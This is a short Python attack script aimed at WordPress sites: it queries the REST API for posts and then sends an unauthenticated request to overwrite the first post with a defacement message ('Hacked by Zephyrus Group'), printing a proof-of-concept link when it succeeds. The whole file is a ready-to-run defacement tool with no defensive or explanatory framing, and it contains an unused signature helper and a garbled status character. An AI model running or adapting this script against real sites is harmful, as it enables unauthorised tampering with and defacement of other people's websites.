import requests
import random
import string

def generate_signature(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def exploit(site):
    print(f"[*] Targeting WP REST API at: {site}")
    
    try:
        posts_url = f"{site}/wp-json/wp/v2/posts"
        r = requests.get(posts_url, timeout=10)

        if r.status_code == 200 and isinstance(r.json(), list) and len(r.json()) > 0:
            first_post_id = r.json()[0]['id']
            edit_url = f"{site}/wp-json/wp/v2/posts/{first_post_id}"

            sig = generate_signature()
            new_content = {
                "title": f"Hacked by Zephyrus Group",
                "content": f"<h1>Lynss was here</h1>"
            }

            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)'
            }

            r2 = requests.post(edit_url, json=new_content, headers=headers, timeout=10)

            if r2.status_code in [200, 201]:
                print(f"[âœ”] Post #{first_post_id} overwritten successfully!")
                print(f"[+] PoC: {site}/?p={first_post_id}")
                return True, f"{site}/?p={first_post_id}"
            else:
                print(f"[x] Failed to overwrite post. HTTP {r2.status_code}")
        else:
            print("[-] No accessible posts found, or API locked.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request error: {e}")

    return False, None
